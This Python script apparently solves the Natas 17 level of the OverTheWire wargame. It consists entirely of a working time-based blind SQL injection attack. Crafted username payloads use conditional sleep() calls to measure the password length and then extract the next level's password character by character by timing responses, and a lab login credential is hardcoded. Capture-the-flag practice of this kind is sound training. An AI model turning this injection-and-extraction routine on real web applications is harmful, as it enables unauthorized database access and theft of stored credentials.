#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Tue Mar  9 19:48:40 2021

@author: rohit
"""
import requests

leng1='natas18" and if((length(password)={0}),sleep(4),null); --+'
pass1='natas18" and if((ord(substr(password ,{0},1))={1}),sleep(5),null); --+'

url = "http://natas17.natas.labs.overthewire.org/index.php?username="
session = requests.Session()
success = requests.get(url+'natas18" and sleep(4); --+',auth=requests.auth.HTTPBasicAuth('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'))
print("Time",success.elapsed.total_seconds())
leng=0
for i in range(0,100):
    load = leng1.format(i)
    response = requests.get(url+load,auth=requests.auth.HTTPBasicAuth('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'))
    time = response.elapsed.total_seconds()
    if (time > 4):
        leng = i
        print("Length :",leng)
        break
password=""
for i in range(1,leng+1):
    for j in range(0,128):
        load = pass1.format(i,j)
        response = requests.get(url+load,auth=requests.auth.HTTPBasicAuth('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'))
        time = response.elapsed.total_seconds()
        if (time > 5):
            password += chr(j)
            print("Password :",password)
            break;
print("Password :",password)